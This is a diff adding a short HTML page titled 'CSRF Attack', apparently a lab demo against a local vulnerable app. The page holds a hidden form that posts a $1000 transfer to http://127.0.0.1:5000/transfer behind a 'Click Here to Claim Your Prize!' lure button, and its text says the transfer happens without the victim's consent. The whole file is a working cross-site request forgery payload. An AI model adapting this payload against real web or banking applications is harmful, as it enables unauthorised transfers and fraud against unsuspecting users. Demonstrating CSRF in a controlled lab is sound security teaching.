@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF Attack</title>
+</head>
+<body>
+    <h1>CSRF Attack</h1>
+    <p>This form will transfer $1000 from the victim's account to the attacker's account without their consent.</p>
+
+    <!-- This form submits a hidden POST request to the vulnerable app -->
+    <form action="http://127.0.0.1:5000/transfer" method="POST">
+        <input type="hidden" name="amount" value="1000">
+        <button type="submit">Click Here to Claim Your Prize!</button>
+    </form>
+</body>
+</html>
